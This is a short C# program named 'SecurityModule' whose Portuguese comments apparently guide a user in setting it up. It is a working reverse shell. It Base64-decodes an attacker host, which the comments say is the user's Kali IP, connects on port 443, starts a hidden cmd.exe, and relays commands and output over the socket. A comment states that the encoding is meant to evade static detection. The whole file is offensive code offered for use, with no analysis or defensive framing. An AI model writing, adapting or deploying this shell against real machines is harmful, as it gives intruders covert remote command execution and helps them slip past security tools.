using System;
using System.Text;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;

public class SecurityModule {
    // Decodifica strings em tempo de execução para evitar detecção estática
    private static string GetConfig(string encoded) {
        return Encoding.UTF8.GetString(Convert.FromBase64String(encoded));
    }

    public static void Main(string[] args) {
        try {
            // "IP-KALI-BASE64" deve ser o seu IP (ex: 192.168.1.10) em Base64
            string h = GetConfig("IP-KALI-BASE64"); 
            int p = 443; 
            
            using (TcpClient c = new TcpClient(h, p)) {
                using (Stream s = c.GetStream()) {
                    StreamReader r = new StreamReader(s);
                    StreamWriter w = new StreamWriter(s);

                    Process proc = new Process();
                    // Y21kLmV4ZQ== = cmd.exe
                    proc.StartInfo.FileName = GetConfig("Y21kLmV4ZQ==");
                    proc.StartInfo.CreateNoWindow = true;
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.RedirectStandardOutput = true;
                    proc.StartInfo.RedirectStandardInput = true;
                    proc.StartInfo.RedirectStandardError = true;

                    proc.OutputDataReceived += (sender, e) => {
                        if (!string.IsNullOrEmpty(e.Data)) {
                            w.WriteLine(e.Data);
                            w.Flush();
                        }
                    };

                    proc.Start();
                    proc.BeginOutputReadLine();

                    string line;
                    while ((line = r.ReadLine()) != null) {
                        proc.StandardInput.WriteLine(line);
                    }
                }
            }
        } catch { }
    }
}